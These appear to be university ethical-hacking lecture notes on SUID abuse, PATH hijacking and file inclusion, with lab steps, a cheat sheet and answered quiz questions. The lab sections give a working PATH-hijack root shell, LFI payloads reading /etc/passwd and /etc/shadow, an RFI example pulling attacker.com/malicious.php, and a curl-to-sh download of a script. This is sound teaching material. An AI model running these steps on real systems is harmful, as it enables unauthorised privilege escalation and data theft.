# Week 8 — Misconfigured File Permissions

> **Module:** UOP M31880 Ethical Hacking
> **Lecturer:** Tobi Fajana
> **Topic:** Misconfigured File Permissions — SUID, PATH Exploitation, LFI/RFI

---

## Table of Contents

1. [Linux File Permissions Fundamentals](#1-linux-file-permissions-fundamentals)
2. [Special Permissions — SUID, SGID, Sticky Bit](#2-special-permissions--suid-sgid-sticky-bit)
3. [Finding Files — which, locate, find](#3-finding-files--which-locate-find)
4. [Analysing Files](#4-analysing-files)
5. [PATH Variable Exploitation](#5-path-variable-exploitation)
6. [Local File Inclusion (LFI)](#6-local-file-inclusion-lfi)
7. [Remote File Inclusion (RFI)](#7-remote-file-inclusion-rfi)
8. [Lab — Setup & Compiling a Vulnerable Binary](#8-lab--setup--compiling-a-vulnerable-binary)
9. [Lab — SUID Exploitation](#9-lab--suid-exploitation)
10. [Lab — PATH Binary Exploitation](#10-lab--path-binary-exploitation)
11. [Lab — Local File Inclusion with DVWA](#11-lab--local-file-inclusion-with-dvwa)
12. [Lab — Fuzzing LFI with wfuzz](#12-lab--fuzzing-lfi-with-wfuzz)
13. [Useful Bash Tricks](#13-useful-bash-tricks)
14. [Practice Questions](#14-practice-questions)
15. [Cheat Sheet](#15-cheat-sheet)
16. [Recommended TryHackMe Labs](#16-recommended-tryhackme-labs)
17. [Recommended Reading](#17-recommended-reading)

---

## 1. Linux File Permissions Fundamentals

In Linux, **everything is a file**. Every file has three types of permissions for three categories of users.

### Permission Types

| Symbol | Permission | Octal | Meaning |
|---|---|---|---|
| `r` | Read | 4 | View file contents / list directory |
| `w` | Write | 2 | Modify file / add/remove files in directory |
| `x` | Execute | 1 | Run as program / enter directory |

### User Categories

| Symbol | Category | Description |
|---|---|---|
| `u` | User (Owner) | The file's owner |
| `g` | Group | Users in the file's group |
| `o` | Others | Everyone else |

### Reading Permission Strings

```
-rwxr-xr-- 1 owner group  size date filename
│├─┤├─┤├─┤
│ u   g   o
│
└─ File type (- = file, d = directory, l = symlink)
```

Example: `-rwxr-xr--` = **754** in octal
- Owner: `rwx` = 4+2+1 = **7**
- Group: `r-x` = 4+0+1 = **5**
- Others: `r--` = 4+0+0 = **4**

### Permission Commands

```bash
chmod 755 file          # Set permissions using octal
chmod u+x file          # Add execute for owner
chmod go-w file         # Remove write for group and others
chown user:group file   # Change ownership
chgrp group file        # Change group
```

---

## 2. Special Permissions — SUID, SGID, Sticky Bit

These are **critical** for privilege escalation:

| Permission | Symbol | Octal | Description |
|---|---|---|---|
| **SUID** (Set User ID) | `s` in user execute | 4000 | File always executes as the **file owner**, regardless of who runs it |
| **SGID** (Set Group ID) | `s` in group execute | 2000 | File executes as the **group owner** |
| **Sticky Bit** | `t` in others execute | 1000 | Only the file owner can delete files in the directory |

### Setting Special Permissions

```bash
chmod u+s file          # Set SUID
chmod g+s file          # Set SGID
chmod o+t directory     # Set Sticky Bit
chmod ug+s file         # Set both SUID and SGID
chmod 4755 file         # SUID + rwxr-xr-x
```

### Identifying SUID Files

```
-rwsr-xr-x   ← The 's' in owner execute = SUID is set
-rwxr-sr-x   ← The 's' in group execute = SGID is set
drwxrwxrwt   ← The 't' in others execute = Sticky bit
```

### Why SUID Is Dangerous

If a SUID binary owned by **root** has a vulnerability, **any user** who runs it effectively runs code as root. This is a primary privilege escalation vector.

---

## 3. Finding Files — which, locate, find

### `which` — Find Commands in PATH

```bash
which ls            # /bin/ls
which python3       # /usr/bin/python3
```

Only searches directories in `$PATH`.

### `locate` — Fast Database Search

```bash
sudo updatedb              # Update the locate database
locate PasswordChecker     # Search by name (fast!)
```

Searches a pre-built database (`locate.db`) — very fast but may be outdated.

### `find` — Comprehensive Disk Search

```bash
# Find files with SUID permissions
find / -perm -u=s -type f 2>/dev/null

# Find files by name
find / -name "PasswordChecker" 2>/dev/null

# Find config files
find / -name "*config*" 2>/dev/null

# Find password-related files
find / -name "*Passw*" 2>/dev/null

# Find scripts in home directories
find /home -name "*.sh*" 2>/dev/null
```

> `2>/dev/null` suppresses "Permission denied" errors.

---

## 4. Analysing Files

### Reading File Contents

```bash
cat PasswordChecker          # View raw file (binary will look garbled)
strings PasswordChecker      # Extract readable text from binary
```

The `strings` command reveals:
- Hardcoded passwords
- Function names
- Library references
- Error messages

### Identifying File Types

```bash
file PasswordChecker         # ELF 32-bit LSB executable...
```

### Extracting Metadata

```bash
exiftool PasswordChecker     # Author, dates, creation info
```

### Hex Editing (Advanced)

```bash
xxd PasswordChecker | head   # View hex dump
hexeditor PasswordChecker    # Edit hex values directly
```

---

## 5. PATH Variable Exploitation

### How PATH Works

When you type a command (e.g., `ls`), the shell searches directories in `$PATH` in order:

```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
```

The shell uses the **first match** it finds. This is exploitable.

### The Attack

If a SUID binary calls another command (e.g., `ps`) **without its full path**, we can:

1. Create a malicious version of that command
2. Add our directory to the **front** of `$PATH`
3. The SUID binary runs our version instead

### Step-by-Step

```bash
# 1. Go to /tmp (writable by all users)
cd /tmp

# 2. Create a fake 'ps' that spawns a shell
echo "/bin/sh" > ps

# 3. Make it executable
chmod +x ps

# 4. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 5. Run the vulnerable SUID binary
/PasswordChecker

# 6. Verify privilege escalation
whoami
# → root (or the SUID file owner)
```

### Why This Works

```
Normal:     PasswordChecker calls 'ps' → /bin/ps (system tool)
Exploited:  PasswordChecker calls 'ps' → /tmp/ps (our shell!)
```

Because the SUID binary runs as its owner, our injected shell inherits those privileges.

---

## 6. Local File Inclusion (LFI)

LFI allows attackers to read or execute files on the server by manipulating file path parameters.

### Identifying Vulnerable Points

Look for URL parameters that reference files:
```
http://target/page.php?page=include.php
http://target/index.php?file=about.html
http://target/view.php?lang=en.php
```

### Basic LFI

Replace the expected file with a sensitive system file:
```
http://target/dvwa/vulnerabilities/fi/?page=/etc/passwd
```

### Directory Traversal

Use `../` to navigate up the filesystem:
```
http://target/dvwa/vulnerabilities/fi/?page=/var/www/../../etc/passwd
```

This works because the web root is typically `/var/www`, and `../../` navigates up to `/`.

### Bypass Techniques

| Technique | Example |
|---|---|
| **Path traversal** | `../../../etc/passwd` |
| **Null byte** (older PHP) | `../../../etc/passwd%00` |
| **URL encoding** | `%2e%2e%2f` for `../` |
| **Double encoding** | `%252e%252e%252f` |
| **PHP wrappers** | `php://filter/convert.base64-encode/resource=config.php` |

---

## 7. Remote File Inclusion (RFI)

RFI is similar to LFI but includes files from **external servers**:

```
http://target/page.php?lang=http://attacker.com/malicious.php
```

This is more dangerous than LFI because the attacker controls the included file entirely. However, it requires `allow_url_include` to be enabled in PHP configuration.

---

## 8. Lab — Setup & Compiling a Vulnerable Binary

### Environment

Same setup as previous weeks — Attackbox, EH Machine, Metasploitable2, all on `vboxnet0`.

### Create the Vulnerable Binary

```bash
# Verify your username
whoami

# Create the vulnerable C program
vi PasswordChecker.c
# (Paste the provided PasswordChecker.c source code)

# Install 32-bit compiler support
sudo apt install gcc-multilib

# Compile with security features disabled
gcc -o PasswordChecker PasswordChecker.c \
    -fno-stack-protector \    # Disable stack protection
    -m32 \                    # 32-bit binary
    -no-pie                   # Disable position-independent executable

# Test it
./PasswordChecker

# Copy to root directory
sudo cp PasswordChecker /

# Set permissions: readable/writable/executable by all
sudo chmod 777 /PasswordChecker

# Set SUID and SGID bits
sudo chmod ug+s /PasswordChecker

# Verify
ls -l /PasswordChecker
# Should show: -rwsrwsrwx
```

### Compiler Flags Explained

| Flag | Purpose |
|---|---|
| `-fno-stack-protector` | Disables stack canary protection (for demonstration) |
| `-m32` | Compiles as 32-bit Intel binary |
| `-no-pie` | Disables position-independent executable (fixed addresses) |

---

## 9. Lab — SUID Exploitation

### Create a Low-Privilege User

```bash
# Create new user (no sudo)
sudo adduser yourname

# Switch to the new user
su yourname
```

### Discover SUID Files

```bash
# Find all SUID files on the system
find / -perm -u=s -type f 2>/dev/null
```

### Analyse the Binary

```bash
# Read readable strings from the binary
strings /PasswordChecker

# Look for:
# - Hardcoded passwords
# - Function names (system(), exec())
# - Referenced commands (ps, ls, cat)
```

### Exploit

If you find a hardcoded password, use it. If the binary calls external commands without full paths, proceed to PATH exploitation (next section).

---

## 10. Lab — PATH Binary Exploitation

```bash
# As the low-privilege user:

# 1. Navigate to /tmp
cd /tmp

# 2. Create a malicious 'ps' file
echo "/bin/sh" > ps

# 3. Make it executable
chmod +x ps

# 4. Add /tmp to the front of PATH
export PATH=/tmp:$PATH

# 5. Run the SUID binary
/PasswordChecker

# 6. Check — you should now be the SUID owner
whoami
```

> **Key concept:** The PasswordChecker binary calls `ps` internally. By placing our fake `ps` first in PATH, it runs `/bin/sh` with the SUID owner's privileges.

---

## 11. Lab — Local File Inclusion with DVWA

### Setup

Navigate to DVWA's File Inclusion page:
```
http://<target-ip>/dvwa/vulnerabilities/fi/?page=include.php
```

### Basic LFI

Replace `include.php` with a system file:
```
http://<target-ip>/dvwa/vulnerabilities/fi/?page=/etc/passwd
```

### Directory Traversal

```
http://<target-ip>/dvwa/vulnerabilities/fi/?page=/var/www/../../etc/passwd
```

---

## 12. Lab — Fuzzing LFI with wfuzz

### Setup

```bash
# Download a LFI fuzz list
wget https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/dirTraversal-nix.txt

# Install wfuzz
sudo apt install wfuzz

# View the fuzz list
cat dirTraversal-nix.txt
```

### Get Cookie Values

1. Log into DVWA in your browser
2. Right-click → Inspect → Network tab
3. Find the `PHPSESSID` and `security` cookie values

### Run wfuzz

```bash
wfuzz -c \
  -z file,dirTraversal-nix.txt \
  -ss "root" \
  -b "PHPSESSID=YOUR_SESSION_ID" \
  -b "security=low" \
  -u 'http://<target-ip>/dvwa/vulnerabilities/fi/?page=FUZZ'
```

### wfuzz Options

| Flag | Description |
|---|---|
| `-c` | Coloured output |
| `-z file,<list>` | Use a wordlist file as the payload |
| `-ss "root"` | Only show responses containing "root" |
| `-b "cookie=value"` | Set a cookie |
| `-u` | Target URL (`FUZZ` is replaced by each payload) |

---

## 13. Useful Bash Tricks

### Comments
```bash
# This is a comment — Bash ignores everything after #
```

### Tab Completion
```bash
./Password[TAB]    # Auto-completes to ./PasswordChecker
```

### Special Characters
```bash
# ! is special in Bash — escape it:
./PasswordChecker 'easyunC0mpl!c4t3dPassword'    # Single quotes
./PasswordChecker easyunC0mpl\!c4t3dPassword      # Backslash escape
```

### History
```bash
history            # View all previous commands
# Use Up/Down arrows to cycle through history
```

### Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| `Ctrl+A` / `Home` | Move to beginning of line |
| `Ctrl+E` / `End` | Move to end of line |
| `Ctrl+Shift+C` | Copy highlighted text |
| `Ctrl+Shift+V` | Paste text |
| `Ctrl+Left/Right` | Move one word left/right |
| `Ctrl+C` | Cancel current command |
| `Ctrl+Z` | Suspend current process |
| `Ctrl+U` | Clear line before cursor |

---

## 14. Practice Questions

**20 MCQs based on Week 8 material.**

---

**Q1.** Which feature grants files elevated permissions even when executed by a non-privileged user?

- A. SUID
- B. UID
- C. ID
- D. STICKY ID

<details><summary>Answer</summary>A. SUID (Set User ID)</details>

---

**Q2.** What command helps identify files with SUID permissions?

<details><summary>Answer</summary>find (specifically: find / -perm -u=s -type f 2>/dev/null)</details>

---

**Q3.** What does SUID stand for?

- A. Set User ID
- B. Special User Information Directory
- C. Set User Information Directory
- D. Secure User ID

<details><summary>Answer</summary>A. Set User ID</details>

---

**Q4.** Which file has SUID permissions set?
```
-rw-r--r-- 1 root root  file1.txt
-rwxr-xr-x 1 root root  file2.sh
-rwsr-xr-x 1 root root  file3.bin
-rwxrwxrwx 1 root root  file4.log
```

<details><summary>Answer</summary>file3.bin — the 's' in the owner execute position indicates SUID</details>

---

**Q5.** Which file has SUID? `net_scan` with permissions `-rwsr-xr--`

<details><summary>Answer</summary>net_scan — the 's' in owner execute confirms SUID</details>

---

**Q6.** Calculate octal permissions for `-rwxr-xr-x` and `-rwxrw-r--`:

<details><summary>Answer</summary>0755 (rwxr-xr-x) and 0764 (rwxrw-r--)</details>

---

**Q7.** Which command lists all `.sql` files from the root directory recursively?

<details><summary>Answer</summary>find / -name *.sql -exec ls -l {}</details>

---

**Q8.** What describes an attack where the attacker includes local files on a web server through manipulating input parameters?

<details><summary>Answer</summary>Local File Inclusion (LFI)</details>

---

**Q9.** Which programming practice helps prevent file inclusion vulnerabilities?

<details><summary>Answer</summary>Whitelisting allowed file paths</details>

---

**Q10.** Which tool enumerates file permissions and finds sensitive files on a compromised system?

<details><summary>Answer</summary>LinPEAS</details>

---

**Q11.** Which defensive measure limits damage from compromised file permissions?

<details><summary>Answer</summary>Enable strict user-based permissions</details>

---

**Q12.** Which tool can scan web applications specifically for LFI vulnerabilities?

<details><summary>Answer</summary>Burp Suite</details>

---

**Q13.** What practice helps identify dangerous files with weak permissions?

<details><summary>Answer</summary>Performing regular permission checks on sensitive files</details>

---

**Q14.** What does the sticky bit do on a directory?

<details><summary>Answer</summary>Prevents any user other than the file's owner from deleting or moving files</details>

---

**Q15.** Which command provides information about file ownership and permissions?

<details><summary>Answer</summary>ls -l</details>

---

**Q16.** What is the primary purpose of Metasploit's `local_exploit_suggester` module?

<details><summary>Answer</summary>To suggest potential local exploits for a compromised system</details>

---

**Q17.** What technique is commonly used in path traversal attacks?

<details><summary>Answer</summary>Directory backtracking (e.g., ../../)</details>

---

**Q18.** What is the most effective way to prevent path traversal attacks?

<details><summary>Answer</summary>Normalising and sanitising user input</details>

---

**Q19.** Which tool CANNOT be used for directory scanning?

- A. wfuzz
- B. Gobuster
- C. Dirbuster
- D. Lynx
- E. Metasploit

<details><summary>Answer</summary>D. Lynx — it's a text-based web browser, not a directory scanner</details>

---

**Q20.** A URL with `LANG=../../../../../../../xampp/apache/logs/access.log%00` is what attack?

<details><summary>Answer</summary>Local File Inclusion (LFI)</details>

---

## 15. Cheat Sheet

### File Permissions

```bash
# === View Permissions ===
ls -l /path/to/file

# === Octal Reference ===
# r=4  w=2  x=1
# 755 = rwxr-xr-x    644 = rw-r--r--
# 777 = rwxrwxrwx     4755 = SUID + rwxr-xr-x

# === Set Permissions ===
chmod 755 file              # Standard executable
chmod u+s file              # Add SUID
chmod g+s file              # Add SGID
chmod o+t directory         # Add sticky bit
chmod ug+s file             # Add SUID + SGID

# === Find SUID Files ===
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

### File Analysis

```bash
strings binary_file         # Extract readable text
file binary_file            # Identify file type
exiftool file               # Extract metadata
xxd file | head             # Hex dump
```

### PATH Exploitation

```bash
cd /tmp
echo "/bin/sh" > ps         # Create fake command
chmod +x ps                 # Make executable
export PATH=/tmp:$PATH      # Hijack PATH
/path/to/suid_binary        # Run SUID binary → get shell
whoami                      # Verify escalation
```

### LFI Payloads

```
# Basic
/etc/passwd
/etc/shadow
/var/log/apache2/access.log

# Directory traversal
../../../etc/passwd
/var/www/../../etc/passwd

# Null byte (older PHP)
../../../etc/passwd%00

# PHP wrapper
php://filter/convert.base64-encode/resource=config.php
```

### wfuzz for LFI

```bash
wfuzz -c \
  -z file,dirTraversal-nix.txt \
  -ss "root" \
  -b "PHPSESSID=xxx" \
  -b "security=low" \
  -u 'http://target/vuln.php?page=FUZZ'
```

### Post-Exploitation Enumeration

```bash
# LinPEAS — automated privilege escalation check
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
find / -perm -u=s -type f 2>/dev/null     # SUID files
find / -writable -type d 2>/dev/null       # Writable directories
cat /etc/crontab                           # Cron jobs
sudo -l                                    # Sudo permissions
```

---

## 16. Recommended TryHackMe Labs

| Room | Difficulty | Free? | Why It's Relevant |
|---|---|---|---|
| [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) | Medium | Free | SUID exploitation, PATH manipulation, cron jobs, kernel exploits |
| [File Inclusion](https://tryhackme.com/room/fileinc) | Medium | Sub | LFI and RFI techniques with bypass methods |
| [Linux Fundamentals Part 3](https://tryhackme.com/room/linuxfundamentalspart3) | Easy | Free | File permissions, SUID/SGID, find command, cron |
| [Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc) | Easy | Free | Enumeration scripts, SUID, PATH, capabilities, NFS |
| [DVWA](https://tryhackme.com/room/dvwa) | Easy | Free | Practice LFI, command injection, and file upload on DVWA |

**Suggested order:** Linux Fundamentals Part 3 → Common Linux Privesc → Linux PrivEsc → File Inclusion → DVWA

---

## 17. Recommended Reading

- **Exploiting Software: How To Break Code** — Gary McGraw & Greg Hoglund
- **Sockets, Shellcode, Porting, and Coding** — James C. Foster
- **The Hacker Playbook 3** — Peter Kim

---

*Week 8 of 12 — UOP M31880 Ethical Hacking*
